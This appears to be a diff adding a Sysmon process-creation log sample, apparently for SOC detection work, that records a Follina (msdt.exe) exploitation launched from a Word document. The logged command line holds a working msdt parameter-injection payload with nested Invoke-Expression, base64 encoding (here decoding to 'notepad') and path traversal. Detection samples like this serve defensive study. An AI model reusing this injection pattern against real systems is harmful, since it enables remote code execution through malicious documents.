@@ -1,0 +1,42 @@
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
++ <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>1</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>1</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2022-05-31T18:12:14.1502503Z" /> 
+  <EventRecordID>110379808</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="5896" ThreadID="7252" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>REDACTED</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">technique_id=T1027,technique_name=Obfuscated Files or Information</Data> 
+  <Data Name="UtcTime">2022-05-31 18:12:14.143</Data> 
+  <Data Name="ProcessGuid">{be3ad077-5a7e-6296-1c51-000000002700}</Data> 
+  <Data Name="ProcessId">31400</Data> 
+  <Data Name="Image">C:\Windows\System32\msdt.exe</Data> 
+  <Data Name="FileVersion">10.0.22000.1 (WinBuild.160101.0800)</Data> 
+  <Data Name="Description">Diagnostics Troubleshooting Wizard</Data> 
+  <Data Name="Product">Microsoft® Windows® Operating System</Data> 
+  <Data Name="Company">Microsoft Corporation</Data> 
+  <Data Name="OriginalFileName">msdt.exe</Data> 
+  <Data Name="CommandLine">"C:\Windows\system32\msdt.exe" ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'bm90ZXBhZA=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"</Data> 
+  <Data Name="CurrentDirectory">D:\soc\msdt-folina\</Data> 
+  <Data Name="User">REDACTED</Data> 
+  <Data Name="LogonGuid">{be3ad077-0c40-6296-4eaf-2b0000000000}</Data> 
+  <Data Name="LogonId">0x2baf4e</Data> 
+  <Data Name="TerminalSessionId">1</Data> 
+  <Data Name="IntegrityLevel">Medium</Data> 
+  <Data Name="Hashes">SHA1=5A5507E05A81A2FCC6C2BB5D59955B30E7B8F2A9,MD5=34CA527E0DE6FA60DDBF633F1CFF7DC3,SHA256=AE98210A080C9F124AC7224B719773B11F70E48404AE394E3F7311A06532EB81,IMPHASH=0755363D7DC0FF5C83A7878C35DEB642</Data> 
+  <Data Name="ParentProcessGuid">{be3ad077-5a6f-6296-0f51-000000002700}</Data> 
+  <Data Name="ParentProcessId">25728</Data> 
+  <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data> 
+  <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE" /n "REDACTED\follina.doc" /o ""</Data> 
+  </EventData>
+  </Event>
